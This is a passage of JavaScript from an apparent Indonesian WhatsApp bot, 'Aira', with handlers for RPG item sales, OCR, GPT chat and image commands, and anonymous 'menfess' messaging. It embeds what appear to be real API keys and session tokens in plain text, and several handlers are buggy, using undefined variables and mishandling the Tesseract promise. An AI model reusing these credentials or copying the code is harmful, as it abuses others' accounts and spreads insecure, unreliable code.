if ( getMancingIkan(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ikan kamu belum cukup, minimal 2 ikan`)
if ( getMancingIkan(m.sender) >= 1 ) {
jualIkan(m.sender, bayar)
addKoinUser(m.sender, hasil1)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah ikan dijual:* ${bayar}${enter}*Uang didapat:* ${hasil1}${enter}${enter}*Sisa ikan:* ${getMancingIkan(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break

case 'jualcoal':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaCoal = 15000
const hasil2 = bayar * hargaCoal
if ( getMiningcoal(m.sender) <= 1 ) return newReply(`Maaf ${pushname} kamu tidak punya coal`)
if ( getMiningcoal(m.sender) >= 1 ) {
jualcoal(m.sender, bayar)
addKoinUser(m.sender, hasil2)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'lebur':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaOre = 2
const hasil3 = bayar * hargaOre
if ( getMiningore(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ore kamu belum cukup, minimal 2 ore`)
if ( getMiningore(m.sender) >= 1 ) {
jualore(m.sender, bayar)
addIngot(m.sender, hasil3)
await newReply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
}
}
break
case 'jualstone':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return newReply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
addKoinUser(m.sender, hasil4)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualingot':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIngot = 35000
const hasil5 = bayar * hargaIngot
if ( getMiningingot(m.sender) <= 1 ) return newReply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
if ( getMiningingot(m.sender) >= 1 ) {
jualingot(m.sender, bayar)
addKoinUser(m.sender, hasil5)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualkayu':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaKayu = 18000
const hasil6 = bayar * hargaKayu
if ( getNebangKayu(m.sender) <= 1 ) return newReply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu`)
if ( getNebangKayu(m.sender) >= 1 ) {
jualkayu(m.sender, bayar)
addKoinUser(m.sender, hasil6)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await checkATMuser(m.sender)}`)
}
}
break
case 'nebang':{
setTimeout( () => {
const oreo = Math.ceil(Math.random() * 20)
addKayu(m.sender, oreo)
newReply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${oreo}*kayu selama 2 menit`)
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang menebang, silahkan tunggu...')
}, 0) //1sec
}
break
case 'goplanet':{
setTimeout( () => {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
addPlanet(m.sender, bertualang)
newReply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${bertualang} bahan kimia dari ${planetari}* selama 2 tahun`)
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang meroket 😱, silahkan tunggu... 2 tahun')
}, 0) //1sec
}
break
case 'jualbahankimia':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
buayar= args.join(" ")
const hargakimia = 1000
const dapetin = buayar * hargakimia
if ( getBertualangPlanet(m.sender) <= 1 ) return newReply(`maaf ${pushname} kamu tidak punya bahankimia`)
if ( getBertualangPlanet(m.sender) >= 1 ) {
jualbahankimia(m.sender, buayar)
addKoinUser(m.sender, dapetin)
await newReply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}${enter}${enter}`)
}
}
break

case 'sai2': case 'scanai2': case 'ocrai2':{
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!quoted) return newReply(`Balas/kirim Image Dengan Caption ${prefix + command}`)
  const Tesseract = require('tesseract.js');
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
       newReply('Harap Tunggu Saat Aira Membaca Text Dalam Gambar Mungkin Proses Ini Memakan Cukup Banyak Waktu')
       let media = await Aira.downloadAndSaveMediaMessage(quoted);
       let anu = await TelegraPh(media);
     //  newReply(util.format(anu));
       const { hscan: { text } }=Tesseract.recognize(anu,'eng');
       m.reply(`Hasil Teks Yang Terbaca Dari Gambar:\n\n${hscan}`)
       try{
       const configuration = new Configuration({apiKey: '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',});
       const openai = new OpenAIApi(configuration);
       const response = await openai.createChatCompletion({
       model: "gpt-3.5-turbo",
       //prompt: 'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah : ' + text,
       temperature: 0.9,
       max_tokens: 2000,
       top_p: 1.0,
       frequency_penalty: 0,
//              Stop_Sequnce: ['1::','2::','3::'],
       presence_penalty: 0.6,
       messages:[{role: "system", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: hscan}],});
       db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
       db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
       db.data.users[m.sender].user3 = hscan;
       m.reply(`${response.data.choices[0].message.content}`);
       db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
       db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
       db.data.users[m.sender].aira3 =  response.data.choices[0].message.content;
        } catch (err) {
       //console.log(err);
             newReply("Upss error silahkan hubungi owner agar di fix")
             //newReply(JSON.stringify(err));
             if (err.response) {
                console.log(err.response.status);
                console.log(err.response.data);
                console.log(`${err.response.status}\n\n${err.response.data}`);
         } else {
                console.log(err);
                reply("Maaf, sepertinya ada yang error :"+ err.message);}
       
       
       
       }
}
limitAdd(m.sender, limit)
break
case 'sai': case 'scanai': case 'ocrai':{
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!quoted) return newReply(`Balas/kirim Image Dengan Caption ${prefix + command}`)
  //const Tesseract = require('tesseract.js');
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
       newReply('Harap Tunggu Saat Aira Membaca Text Dalam Gambar Mungkin Proses Ini Memakan Cukup Banyak Waktu')
       let media = await Aira.downloadAndSaveMediaMessage(quoted);
       let anu = await TelegraPh(media);
     //  newReply(util.format(anu));
       /*Tesseract.recognize(util.format(anu),'eng',{ logger: m => console.log(m) }).then(({ data: { text } }) => {
       console.log(text);
       m.reply('Hasil Teks Yang Terbaca Dari Gambar:\n'+text)})*/
       let hscan = await fetchJson('https://api.akuari.my.id/other/ocr?img='+anu)
       m.reply(`Hasil Teks Yang Terbaca Dari Gambar:\n\n${hscan.result}`)
       try{
       const configuration = new Configuration({apiKey: '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',});
       const openai = new OpenAIApi(configuration);
       const response = await openai.createChatCompletion({
       model: "gpt-3.5-turbo",
       //prompt: 'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah : ' + text,
       temperature: 0.9,
       max_tokens: 2000,
       top_p: 1.0,
       frequency_penalty: 0,
//              Stop_Sequnce: ['1::','2::','3::'],
       presence_penalty: 0.6,
       messages:[{role: "system", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: hscan.result}],});
       db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
       db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
       db.data.users[m.sender].user3 = hscan.result;
       m.reply(`${response.data.choices[0].message.content}`);
       db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
       db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
       db.data.users[m.sender].aira3 =  response.data.choices[0].message.content;
        } catch (err) {
       //console.log(err);
             newReply("Upss error silahkan hubungi owner agar di fix")
             //newReply(JSON.stringify(err));
             if (err.response) {
                console.log(err.response.status);
                console.log(err.response.data);
                console.log(`${err.response.status}\n\n${err.response.data}`);
         } else {
                console.log(err);
                reply("Maaf, sepertinya ada yang error :"+ err.message);}
       
       
       
       }
}
limitAdd(m.sender, limit)
break

case 'cimg':{
  const LexicaArt = require('lexicaart');

  const main = async () => {
    const lexicaart = new LexicaArt({
      sessionToken: 'eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..LkziNktNRLoxq0pW.BdUl3_QRi_VRqf5Zy_cregIGQtqqxyH6aB8EEPMpw6YytmBPNv7XtPUncvpSWmrjdIY7NiC0Bxbe_9t6QQjHExTSWLxQPL1w-MG6JgUEld_bt009Q3XF7N31j_8FE96k20mf77G2MHzQghZEca3hQ3AaBQNRoYvXcgB6163gevTUdFF69IWvIrWzEWh8JuyBsj8aFCFa7SPX6JVKdnNYIPiuxUNKO18OuoIjE4lPDouy-pk4498CLBpPlJ1y6b_tKPzfFQLOSC4FgptHwyrEV3ek5b12hCqhDyiAr_Ms3CkOF68GzngSVrcLKEfl-1xN8OYfnMROHUCOz9mAKT8CYKhPVMQCjqI0xldSIB8_MPxv363vKU0bUD0dAWLeMBEaCncxs2-0fKOt.d5kAil4o1kFyt01KeNtETg',
      csrfToken: '20b56c9f2eb630c54e7b791364f6e62ddd96bc950d98d4f961ec5c2a1f51a05d%7C5ac67a17e8a6dccfa45a3eee7e93c310890c81afd51eb97d4f1b1a277f550d4c'
    });
    const info = await lexicaart.create('A steampunk teddy with a knife');
    console.log('INFO', info);
  }
  
  main();
}
break
case 'cimg2':{
  const LexicaArt = require('lexicaart');

const main = async () => {
  const lexicaart = new LexicaArt();
  const images = await lexicaart.search('A steampunk teddy with a knife');
  console.log('Title', images[0].prompt);
  console.log('images', images[0].images);
}

main();
}
break

case 'scan': case 'scantext': case 'ocr':{
    if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
       if (!quoted) return newReply(`Balas/kirim Image Dengan Caption ${prefix + command}`)
          const Tesseract = require('tesseract.js');
    if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
       newReply('Harap Tunggu Saat Aira Membaca Text Dalam Gambar Mungkin Proses Ini Memakan Cukup Banyak Waktu')
       let media = await Aira.downloadAndSaveMediaMessage(quoted);
       let anu = await TelegraPh(media);
     //  newReply(util.format(anu));
       /*Tesseract.recognize(util.format(anu),'eng',{ logger: m => console.log(m) }).then(({ data: { text } }) => {
       console.log(text);
       m.reply(text)})*/
       let hscan = await fetchJson('https://api.akuari.my.id/other/ocr?img='+anu)
       m.reply(`Hasil Teks Yang Terbaca Dari Gambar:\n${hscan.result}`)
       newReply('Apabila Hasil Scan Tidak Sesuai, Harap Crop Foto Sehingga Hanya Ada Text Yang Akan Di scan, Pastikan Juga Agar Foto Tidak Buram Dan Text Tidak Menggunakan Font Yang Aneh!\n')
}
limitAdd(m.sender, limit)
break

case 'scan2': case 'scantext2': case 'ocr2':{
    if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
       if (!quoted) return newReply(`Balas/kirim Image Dengan Caption ${prefix + command}`)
          const Tesseract = require('tesseract.js');
    if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
       newReply('Harap Tunggu Saat Aira Membaca Text Dalam Gambar Mungkin Proses Ini Memakan Cukup Banyak Waktu')
       let media = await Aira.downloadAndSaveMediaMessage(quoted);
       let anu = await TelegraPh(media);
     //  newReply(util.format(anu));
       var hscan2 = '';
       Tesseract.recognize(util.format(anu),'eng',{ logger: m => console.log(m) }).then(({ data: { text } }) => {
       console.log(text);
       m.reply(text)})
       hscan2=text;
       m.reply(`Hasil Teks Yang Terbaca Dari Gambar:\n${hscan2}`)
       newReply('Apabila Hasil Scan Tidak Sesuai, Harap Crop Foto Sehingga Hanya Ada Text Yang Akan Di scan, Pastikan Juga Agar Foto Tidak Buram Dan Text Tidak Menggunakan Font Yang Aneh!\n')
}
limitAdd(m.sender, limit)
break
/*
case 'ai':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text&&!quoted) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} apa itu openai`)
let teks = m.quoted ? quoted.text : text
newReply(mess.wait)
try {
 const configuration = new Configuration({
apiKey: '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',
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
  model: "gpt-3.5-turbo",
  //prompt: 'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah : ' + text,
  temperature: 0.9,
  max_tokens: 2000,
  top_p: 1.0,
  frequency_penalty: 0,
//              Stop_Sequnce: ['1::','2::','3::'],
  presence_penalty: 0.6,
  messages:[{role: "system", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: teks}],
});
db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
db.data.users[m.sender].user3 = teks;
m.reply(`${response.data.choices[0].message.content}`);
db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
db.data.users[m.sender].aira3 =  response.data.choices[0].message.content;
} catch (err) {
  //console.log(err);
  newReply("Upss error silahkan hubungi owner agar di fix")
  //newReply(JSON.stringify(err));
  if (err.response) {
    console.log(err.response.status);
    console.log(err.response.data);
    console.log(`${err.response.status}\n\n${err.response.data}`);
    } else {
    console.log(err);
    reply("Maaf, sepertinya ada yang error :"+ err.message);}
  }
}
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
break*/

case 'ai':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text&&!quoted) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} apa itu openai`)
let teks = m.quoted ? quoted.text : text
newReply(mess.wait)
try {
const gpt = new d.ai.GPT()
const messages = [{role: "assistant", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah sertakan emoji di setiap responsemu\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: teks}];
    let res = await gpt.fetchData(messages)
    
db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
db.data.users[m.sender].user3 = teks;
m.reply(`${res}`);
db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
db.data.users[m.sender].aira3 =  res;
} catch (err) {
  newReply("Upss error silahkan hubungi owner agar di fix")
}
}
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
limitAdd(m.sender, limit)
break



case 'resetai': case 'resai':{
db.data.users[m.sender].user1 = '';
db.data.users[m.sender].user2 = '';
db.data.users[m.sender].user3 = '';
db.data.users[m.sender].aira1 = '';
db.data.users[m.sender].aira2 = '';
db.data.users[m.sender].aira3 = '';
await newReply('Berhasi Menghapus History Aira')
    
    
}
break

case "aidraw": case "aidrawing": case "image": case "img": case 'chatgptimg': case 'openaiimg': case 'aiimg':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} kabbah`)
newReply(mess.wait)
try {
const configuration = new Configuration({
apiKey: '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',
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
Aira.sendMessage(m.chat, {image:{url: response.data.data[0].url},caption: ""}, {quoted:m});
} catch (error) {
newReply(error.message);
}
limitAdd(m.sender, limit)
}
break
case 'ai2': case 'chatgpt2':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh:\n${prefix}${command} Apa itu chatgpt`)
let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${setting.XznKey}&text=${text}&system=Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah`)
const gpt = result.result
newReply(`${gpt}`)
} catch (err) {
console.log(err)
newReply('Terjadi Kesalahan')
}
limitAdd(m.sender, limit)
break
case 'ai3': case 'chatgpt3':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh:\n${prefix}${command} Apa itu chatgpt`)
let result = await fetchJson(`https://skizo.tech/api/bard?text=${text}&apikey=${setting.XznKey}`)
newReply(result.content)
} catch (err) {
console.log(err)
newReply('Terjadi Kesalahan')
}
limitAdd(m.sender, limit)
break
case "confess": case 'menfes': case 'menfess':{
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return newReply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return newReply('Fitur Khusus Di private chat!')
if (!text) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return newReply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_\n\n> Silahkan klik tombol *terimamenfess* -- Untuk menerima menfess/confess\n> Silahkan klik tombol  *tolakmenfess* -- Untuk menolak menfess/confess\n\n*Jika anda menerima confess maka anda akan dapat saling mengirim chat melalui bot ini!*`
let tod = "https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg"
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await send2ButReply(nomorNya+'@s.whatsapp.net',yoi,'Terima Menfess','Terima Menfess','.terimamenfess','Tolak Menfess','Tolak Menfess','.tolakmenfess',tod)
newReply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'terimamenfess': case 'balasmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return newReply("Belum ada sesi menfess")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await send1ButReply(other,`_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess atau klik tombol dibawah ini`,'Stop Menfess','Stop Menfess','.stopmenfess','gaada')
send1ButReply(m.chat,'_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess atau klik tombol dibawah ini','Stop Menfess','Stop Menfess','.stopmenfess','gaada')
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return newReply("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
await Aira.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await Aira.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
newReply("Menfess berhasil di tolak 🤚")
delete this.menfes[roof.id]
}
break
 case "stopconfess": case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return newReply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
await Aira.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
newReply("chat telah di hentikan")
delete this.menfes[find.id]
}
 break
default:
if ((budy) && ["Assalamualaikum", "assalamualaikum","Assalamu'alaikum",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/salam.mp3')
Aira.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Anjay", "anjay",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/anjay.mp3')
Aira.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Ajojing"," ajojing",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/ajojing.mp3')
Aira.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Bot", "bot",].includes(budy) && !isCmd) {
list = ['./media/sound/oy.mp3','./media/sound/kenapa.mp3','./media/sound/iya.mp3']
random = list[Math.floor(Math.random() * list.length)]
goblok = fs.readFileSync(random)
Aira.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Thx", "Tq", "Terimakasih", "Terima kasih" ,"Makasih",].includes(budy) && !isCmd) {
newReply(`Sama-sama kak ${pushname}`)
}
if ((budy) && ["Asu","Anj","Babi","Kntl","Jancok","Bajingan","Memek","Pantek",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/toxic.mp3')
Aira.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["🗿🗿🗿🗿🗿","🗿🗿🗿🗿","🗿🗿","🗿",].
includes(budy) && !isCmd) {
newReply(`🗿`)
}

if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!m.quoted) return newReply('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Aira.sendTextWithMentions(m.chat, anunya, m)
} else {
Aira.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!m.quoted) return newReply('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
